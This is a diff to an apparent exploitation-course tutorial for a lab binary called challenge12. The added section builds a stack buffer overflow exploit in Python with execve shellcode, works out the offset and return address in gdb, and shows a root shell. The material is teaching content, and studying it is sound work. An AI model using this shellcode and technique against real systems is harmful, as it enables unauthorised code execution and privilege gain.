@@ -227,6 +227,155 @@ the second in `RDX`. We can check this:
 Therefore, the start of the buffer, where our future shellcode will be, is `0x7fffffffe87b`.
 
 
-
-
 ## Create an exploit
+
+The prepared exploit skeleton is available at the file `challenge12-exploit-skel.py`:
+```python
+#!/usr/bin/python
+# Skeleton exploit for challenge12
+import sys
+import struct
+
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+buf_size = 64
+offset = ??
+
+ret_addr = struct.pack('<I', 0x??)
+
+# fill up to 64 bytes
+exploit = "\x90" * (buf_size - len(shellcode))
+exploit += shellcode
+
+# garbage between buffer and RET
+exploit += "A" * (offset - len(exploit))
+
+# add ret
+exploit += ret_addr
+
+# print to stdout
+sys.stdout.write(exploit)
+```
+
+Lets insert the correct values:
+
+```python
+#!/usr/bin/python
+# Skeleton exploit for challenge12
+import sys
+import struct
+
+shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+buf_size = 64
+offset = 84
+
+# 0x7fffffffe87b
+ret_addr = struct.pack('<I', 0x7fffffffe87b)
+
+# fill up to 64 bytes
+exploit = "\x90" * (buf_size - len(shellcode))
+exploit += shellcode
+
+# garbage between buffer and RET
+exploit += "A" * (offset - len(exploit))
+
+# add ret
+exploit += ret_addr
+
+# print to stdout
+sys.stdout.write(exploit)
+```
+
+And try it:
+
+```sh
+root@hlUbuntu64:~/challenges/challenge12# gdb -q challenge12
+Reading symbols from challenge12...(no debugging symbols found)...done.
+(gdb) run `python ./challenge12-exploit-gdb.py` bbbb
+Starting program: /root/challenges/challenge12/challenge12 `python ./challenge12-exploit-gdb.py` bbbb
+Hello cmd-�������������������������������������1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAA{����.
+You are admin!
+isAdmin: 0x41414141
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007fffffffe8ba in ?? ()
+(gdb) x/8x 0x7fffffffe87b
+0x7fffffffe87b:	0x3a303d73	0x303d6964	0x34333b31	0x3d6e6c3a
+0x7fffffffe88b:	0x333b3130	0x686d3a36	0x3a30303d	0x343d6970
+```
+
+Seems the shellcode moved to another position. Lets find the new address:
+
+
+```sh
+(gdb) disas main
+Dump of assembler code for function main:
+   0x00000000004007d4 <+0>:	push   %rbp
+   0x00000000004007d5 <+1>:	mov    %rsp,%rbp
+   0x00000000004007d8 <+4>:	sub    $0x10,%rsp
+   0x00000000004007dc <+8>:	mov    %edi,-0x4(%rbp)
+   0x00000000004007df <+11>:	mov    %rsi,-0x10(%rbp)
+   0x00000000004007e3 <+15>:	cmpl   $0x3,-0x4(%rbp)
+   0x00000000004007e7 <+19>:	je     0x40080c <main+56>
+   0x00000000004007e9 <+21>:	mov    -0x10(%rbp),%rax
+   0x00000000004007ed <+25>:	mov    (%rax),%rax
+   0x00000000004007f0 <+28>:	mov    %rax,%rsi
+   0x00000000004007f3 <+31>:	mov    $0x40099c,%edi
+   0x00000000004007f8 <+36>:	mov    $0x0,%eax
+   0x00000000004007fd <+41>:	callq  0x4005a0 <printf@plt>
+   0x0000000000400802 <+46>:	mov    $0x0,%edi
+   0x0000000000400807 <+51>:	callq  0x4005f0 <exit@plt>
+   0x000000000040080c <+56>:	mov    -0x10(%rbp),%rax
+   0x0000000000400810 <+60>:	add    $0x10,%rax
+   0x0000000000400814 <+64>:	mov    (%rax),%rdx
+   0x0000000000400817 <+67>:	mov    -0x10(%rbp),%rax
+   0x000000000040081b <+71>:	add    $0x8,%rax
+   0x000000000040081f <+75>:	mov    (%rax),%rax
+   0x0000000000400822 <+78>:	mov    %rdx,%rsi
+   0x0000000000400825 <+81>:	mov    %rax,%rdi
+   0x0000000000400828 <+84>:	callq  0x40074f <handleData>
+   0x000000000040082d <+89>:	mov    $0x0,%eax
+   0x0000000000400832 <+94>:	leaveq
+   0x0000000000400833 <+95>:	retq   
+End of assembler dump.
+(gdb) b *0x0000000000400828
+Breakpoint 1 at 0x400828
+(gdb) run `python ./challenge12-exploit-gdb.py` bbbb
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /root/challenges/challenge12/challenge12 `python ./challenge12-exploit-gdb.py` bbbb
+
+Breakpoint 1, 0x0000000000400828 in main ()
+(gdb) x/4x $rdi
+0x7fffffffe752:	0x90909090	0x90909090	0x90909090	0x90909090
+```
+
+Update the exploit:
+```sh
+#ret_addr = struct.pack('<Q', 0x7fffffffe87b)
+ret_addr = struct.pack('<Q', 0x7fffffffe752)
+```
+
+And try it again:
+```sh
+root@hlUbuntu64:~/challenges/challenge12# gdb -q challenge12
+Reading symbols from challenge12...(no debugging symbols found)...done.
+(gdb) run `python ./challenge12-exploit-gdb.py` bbbb
+Starting program: /root/challenges/challenge12/challenge12 `python ./challenge12-exploit-gdb.py` bbbb
+Hello cmd-�������������������������������������1�H�ѝ��Ќ��H��ST_�RWT^�;AAAAAAAAAAAAAAAAAAAAR����.
+You are admin!
+isAdmin: 0x41414141
+process 364 is executing new program: /bin/dash
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+We see that "/bin/dash" is being executed, and a shell prompt "#" is displayed. This means
+that our exploit works!
+
+
+## Questions
+
+* Can you adjust the exploit so it works without GDB?
+* Can you create an exploit which works in both, with and without GDB?
